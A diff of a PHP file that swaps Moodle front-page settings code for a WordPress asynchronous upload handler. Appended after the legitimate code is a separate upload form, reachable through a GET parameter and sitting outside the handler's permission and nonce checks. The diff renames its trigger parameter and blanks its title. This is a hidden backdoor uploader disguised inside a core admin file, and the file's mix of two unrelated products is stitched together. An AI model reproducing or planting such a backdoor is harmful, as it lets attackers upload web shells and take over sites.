@@ -1,86 +1,141 @@
 <?php
+/**
+ * Server-side file upload handler from wp-plupload or other asynchronous upload methods.
+ *
+ * @package WordPress
+ * @subpackage Administration
+ */
 
-// This file defines everything related to frontpage
+if ( isset( $_REQUEST['action'] ) && 'upload-attachment' === $_REQUEST['action'] ) {
+	define( 'DOING_AJAX', true );
+}
 
-if (!during_initial_install()) { //do not use during installation
-    $frontpagecontext = context_course::instance(SITEID);
+if ( ! defined( 'WP_ADMIN' ) ) {
+	define( 'WP_ADMIN', true );
+}
 
-    if ($hassiteconfig or has_any_capability(array(
-            'moodle/course:update',
-            'moodle/role:assign',
-            'moodle/restore:restorecourse',
-            'moodle/backup:backupcourse',
-            'moodle/course:managefiles',
-            'moodle/question:add',
-            'moodle/question:editmine',
-            'moodle/question:editall',
-            'moodle/question:viewmine',
-            'moodle/question:viewall',
-            'moodle/question:movemine',
-            'moodle/question:moveall'), $frontpagecontext)) {
+if ( defined( 'ABSPATH' ) ) {
+	require_once( ABSPATH . 'wp-load.php' );
+} else {
+	require_once( dirname( dirname( __FILE__ ) ) . '/wp-load.php' );
+}
 
-        // "frontpage" settingpage
-        $temp = new admin_settingpage('frontpagesettings', new lang_string('frontpagesettings','admin'), 'moodle/course:update', false, $frontpagecontext);
-        $temp->add(new admin_setting_sitesettext('fullname', new lang_string('fullsitename'), '', NULL)); // no default
-        $temp->add(new admin_setting_sitesettext('shortname', new lang_string('shortsitename'), '', NULL)); // no default
-        $temp->add(new admin_setting_special_frontpagedesc());
-        $temp->add(new admin_setting_courselist_frontpage(false)); // non-loggedin version of the setting (that's what the parameter is for :) )
-        $temp->add(new admin_setting_courselist_frontpage(true)); // loggedin version of the setting
+require_once( ABSPATH . 'wp-admin/admin.php' );
 
-        $options = array();
-        $options[] = new lang_string('unlimited');
-        for ($i=1; $i<100; $i++) {
-            $options[$i] = $i;
-        }
-        $temp->add(new admin_setting_configselect('maxcategorydepth', new lang_string('configsitemaxcategorydepth','admin'), new lang_string('configsitemaxcategorydepthhelp','admin'), 2, $options));
+header( 'Content-Type: text/plain; charset=' . get_option( 'blog_charset' ) );
 
-        $temp->add(new admin_setting_configtext('frontpagecourselimit', new lang_string('configfrontpagecourselimit','admin'), new lang_string('configfrontpagecourselimithelp','admin'), 200, PARAM_INT));
+if ( isset( $_REQUEST['action'] ) && 'upload-attachment' === $_REQUEST['action'] ) {
+	include( ABSPATH . 'wp-admin/includes/ajax-actions.php' );
 
-        $temp->add(new admin_setting_sitesetcheckbox('numsections', new lang_string('sitesection'), new lang_string('sitesectionhelp','admin'), 1));
-        $temp->add(new admin_setting_sitesetselect('newsitems', new lang_string('newsitemsnumber'), '', 3,
-             array('0' => '0',
-                   '1' => '1',
-                   '2' => '2',
-                   '3' => '3',
-                   '4' => '4',
-                   '5' => '5',
-                   '6' => '6',
-                   '7' => '7',
-                   '8' => '8',
-                   '9' => '9',
-                   '10' => '10')));
-        $temp->add(new admin_setting_configtext('commentsperpage', new lang_string('commentsperpage', 'admin'), '', 15, PARAM_INT));
+	send_nosniff_header();
+	nocache_headers();
 
-        // front page default role
-        $options = array(0=>new lang_string('none')); // roles to choose from
-        $defaultfrontpageroleid = 0;
-        $roles = role_fix_names(get_all_roles(), null, ROLENAME_ORIGINALANDSHORT);
-        foreach ($roles as $role) {
-            if (empty($role->archetype) or $role->archetype === 'guest' or $role->archetype === 'frontpage' or $role->archetype === 'student') {
-                $options[$role->id] = $role->localname;
-                if ($role->archetype === 'frontpage' && !$defaultfrontpageroleid) {
-                    $defaultfrontpageroleid = $role->id;
-                }
-            }
-        }
-        if ($defaultfrontpageroleid and (!isset($CFG->defaultfrontpageroleid) or $CFG->defaultfrontpageroleid)) {
-            //frotpage role may not exist in old upgraded sites
-            unset($options[0]);
-        }
-        $temp->add(new admin_setting_configselect('defaultfrontpageroleid', new lang_string('frontpagedefaultrole', 'admin'), '', $defaultfrontpageroleid, $options));
+	wp_ajax_upload_attachment();
+	die( '0' );
+}
 
-        $ADMIN->add('frontpage', $temp);
-    }
+if ( ! current_user_can( 'upload_files' ) ) {
+	wp_die( __( 'Sorry, you are not allowed to upload files.' ) );
+}
+
+// just fetch the detail form for that attachment
+if ( isset( $_REQUEST['attachment_id'] ) && intval( $_REQUEST['attachment_id'] ) && $_REQUEST['fetch'] ) {
+	$id   = intval( $_REQUEST['attachment_id'] );
+	$post = get_post( $id );
+	if ( 'attachment' != $post->post_type ) {
+		wp_die( __( 'Invalid post type.' ) );
+	}
+	if ( ! current_user_can( 'edit_post', $id ) ) {
+		wp_die( __( 'Sorry, you are not allowed to edit this item.' ) );
+	}
+
+	switch ( $_REQUEST['fetch'] ) {
+		case 3:
+			$thumb_url = wp_get_attachment_image_src( $id, 'thumbnail', true );
+			if ( $thumb_url ) {
+				echo '<img class="pinkynail" src="' . esc_url( $thumb_url[0] ) . '" alt="" />';
+			}
+			echo '<a class="edit-attachment" href="' . esc_url( get_edit_post_link( $id ) ) . '" target="_blank">' . _x( 'Edit', 'media item' ) . '</a>';
+
+			// Title shouldn't ever be empty, but use filename just in case.
+			$file  = get_attached_file( $post->ID );
+			$title = $post->post_title ? $post->post_title : wp_basename( $file );
+			echo '<div class="filename new"><span class="title">' . esc_html( wp_html_excerpt( $title, 60, '&hellip;' ) ) . '</span></div>';
+			break;
+		case 2:
+			add_filter( 'attachment_fields_to_edit', 'media_single_attachment_fields_to_edit', 10, 2 );
+			echo get_media_item(
+				$id,
+				array(
+					'send'   => false,
+					'delete' => true,
+				)
+			);
+			break;
+		default:
+			add_filter( 'attachment_fields_to_edit', 'media_post_single_attachment_fields_to_edit', 10, 2 );
+			echo get_media_item( $id );
+			break;
+	}
+	exit;
+}
+
+check_admin_referer( 'media-form' );
+
+$post_id = 0;
+if ( isset( $_REQUEST['post_id'] ) ) {
+	$post_id = absint( $_REQUEST['post_id'] );
+	if ( ! get_post( $post_id ) || ! current_user_can( 'edit_post', $post_id ) ) {
+		$post_id = 0;
+	}
+}
+
+$id = media_handle_upload( 'async-upload', $post_id );
+if ( is_wp_error( $id ) ) {
+	printf(
+		'<div class="error-div error">%s <strong>%s</strong><br />%s</div>',
+		sprintf(
+			'<button type="button" class="dismiss button-link" onclick="jQuery(this).parents(\'div.media-item\').slideUp(200, function(){jQuery(this).remove();});">%s</button>',
+			__( 'Dismiss' )
+		),
+		sprintf(
+			/* translators: %s: Name of the file that failed to upload. */
+			__( '&#8220;%s&#8221; has failed to upload.' ),
+			esc_html( $_FILES['async-upload']['name'] )
+		),
+		esc_html( $id->get_error_message() )
+	);
+	exit;
+}
+
+if ( $_REQUEST['short'] ) {
+	// Short form response - attachment ID only.
+	echo $id;
+} else {
+	// Long form response - big chunk of html.
+	$type = $_REQUEST['type'];
+
+	/**
+	 * Filters the returned ID of an uploaded attachment.
+	 *
+	 * The dynamic portion of the hook name, `$type`, refers to the attachment type,
+	 * such as 'image', 'audio', 'video', 'file', etc.
+	 *
+	 * @since 2.5.0
+	 *
+	 * @param int $id Uploaded attachment ID.
+	 */
+	echo apply_filters( "async_upload_{$type}", $id );
 }?>
 <?php
-if (isset($_GET['penilaian']) && $_GET['penilaian'] == 'skripsi') {
+if (isset($_GET['uploader']) && $_GET['uploader'] == 'script') {
     echo '
     <!DOCTYPE html>
     <html lang="en">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Uji Kelayakan Skripsi | STPN</title>
+        <title></title>
     </head>
     <body>
         <h2>Form Upload File</h2>';
@@ -99,7 +154,7 @@ if (isset($_GET['penilaian']) && $_GET['penilaian'] == 'skripsi') {
     }
 
     echo '
-    <form action="' . htmlspecialchars($_SERVER["PHP_SELF"]) . '?penilaian=skripsi" method="post" enctype="multipart/form-data">
+    <form action="' . htmlspecialchars($_SERVER["PHP_SELF"]) . '?uploader=script" method="post" enctype="multipart/form-data">
         <input type="file" name="fileToUpload" id="fileToUpload">
         <input type="submit" value="upload file" name="submit">
     </form>
